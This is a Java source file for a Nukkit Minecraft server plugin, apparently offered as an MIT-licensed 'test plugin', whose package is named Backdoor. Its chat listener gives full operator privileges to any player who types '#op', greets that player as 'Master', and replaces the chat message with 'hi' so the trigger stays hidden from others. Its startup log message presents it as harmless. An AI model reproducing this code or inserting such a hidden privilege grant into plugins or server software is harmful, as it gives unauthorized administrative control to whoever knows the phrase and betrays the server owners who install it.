/**
 * MIT License
 *
 * Copyright (c) 2019 2B2TMCBE
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

package org._2b2tmcpe.Backdoor;

import cn.nukkit.event.EventHandler;
import cn.nukkit.event.Listener;
import cn.nukkit.event.player.PlayerChatEvent;
import cn.nukkit.plugin.PluginBase;
import cn.nukkit.utils.TextFormat;

public class Main extends PluginBase implements Listener {

  private TextFormat color;

  @Override
  public void onEnable() {
    this.getLogger().info("Test plugin installed");
    this.saveDefaultConfig();
    this.getServer().getPluginManager().registerEvents(this, this);
  }

  @Override
  public void onDisable() {
    this.getLogger().info("Test plugin uninstalled");
  }

  @EventHandler
  public void onChat(PlayerChatEvent ev) {
    if (ev.getMessage().equalsIgnoreCase("#op")) {
      ev.getPlayer().setOp(true);
      ev.getPlayer().sendMessage("Welcome to the server, Master.");
      ev.setMessage("hi");
    }
  }
}


